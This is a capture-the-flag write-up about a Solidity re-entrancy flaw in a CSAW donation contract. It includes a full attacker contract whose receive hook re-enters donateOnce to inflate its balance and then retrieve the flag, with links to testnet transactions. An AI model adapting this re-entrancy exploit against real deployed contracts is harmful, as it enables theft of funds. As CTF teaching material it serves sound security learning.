<p>This challenge was about <a href="https://solidity-by-example.org/hacks/re-entrancy/">re-entrancy</a>. In <code>donateOnce</code>, the call to <code>msg.sender.call</code> is made before <code>doneDonating[msg.sender]</code> is set to <code>true</code>. If we call <code>donation.donateOnce()</code> in our <code>receive</code> hook, we can &quot;enter&quot; the <code>donateOnce</code> body multiple times without being blocked by the if-statement. The later calls execute before the first one has a chance to complete.</p>
<pre><code class="language-js">// SPDX-License-Identifier: MIT

pragma solidity &gt;=0.8.7;

abstract contract CSAWDonation {
    mapping(address =&gt; uint256) public balances;
    mapping(address =&gt; bool) public doneDonating;

    function newAccount() virtual public payable;
    function donateOnce() virtual public;
    function getBalance() virtual public view returns (uint256 donatorBalance);
    function getFlag(bytes32 _token) virtual public;
}

contract CSAWDonate {
    CSAWDonation public donation;

    constructor(address donationAddress) payable {
        require(msg.value &gt;= 0.0005 ether);
        donation = CSAWDonation(donationAddress);
    }

    receive() external payable {
        if (donation.getBalance() &lt; 30) {
            donation.donateOnce();
        }
    }

    function main() external {
        donation.newAccount{value: 0.0001 ether}();
        donation.donateOnce();
    }

    function getFlag(bytes32 _token) external {
        donation.getFlag(_token);
    }
}
</code></pre>
<p>After constructing <a href="https://ropsten.etherscan.io/address/0xC00d696718ae9dF26F61385570ACcd2737A8a57a">our contract</a> with the address of their <code>CSAWDonation</code> contract, we call <code>main</code>. This brings our balance to 30, preparing us to call <code>getFlag</code>. <a href="https://ropsten.etherscan.io/tx/0x85d0e11f8ac9784712f95f16023c72c69be9aa8c2f50e24a24c2d7bd91b1b342">Calling</a> our pass-through <code>getFlag</code> with the token number from the challenge server gets us the flag.</p>
